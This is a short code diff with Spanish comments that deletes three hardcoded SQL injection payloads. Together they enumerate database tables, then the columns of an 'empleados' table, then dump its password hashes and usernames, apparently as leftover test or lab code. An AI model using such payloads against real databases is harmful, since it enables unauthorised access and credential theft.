@@ -1,8 +1,0 @@
-# Payload que devuelve todas las tablas de la base de datos (SQL Injection)
-            codigo_diagnostico = "VALOR_FALSO' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='public' --"
-            
-#Payload que devuelve todas las columnas de la tabla empleado (SQL Injection)
-            codigo_diagnostico = "VALOR_FALSO' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='empleados' --"
-            
-#Payload que devuelve los datos de la tabla empleado (SQL Injection)
-            codigo_diagnostico = "VALOR_FALSO' UNION SELECT password_hash, usuario, tipo_empleado FROM empleados --"
